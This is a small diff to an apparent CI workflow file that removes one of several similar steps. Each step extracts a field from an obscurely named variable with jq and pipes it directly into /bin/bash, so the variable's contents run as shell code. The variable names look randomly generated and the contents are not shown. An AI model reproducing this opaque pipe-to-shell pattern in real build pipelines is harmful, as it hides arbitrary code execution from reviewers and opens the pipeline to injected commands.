@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$ia62" | jq -r .nhlp77663 | /bin/bash
           printf '%s' "$xawp54" | jq -r .seut3 | /bin/bash
           echo $q36 | jq -r .rfihq0 | /bin/bash
-          echo $z2366 | jq -r .my855 | /bin/bash
           printf '%s' "$ogf3830" | jq -r .w8 | /bin/bash
 
       - name: Archive output
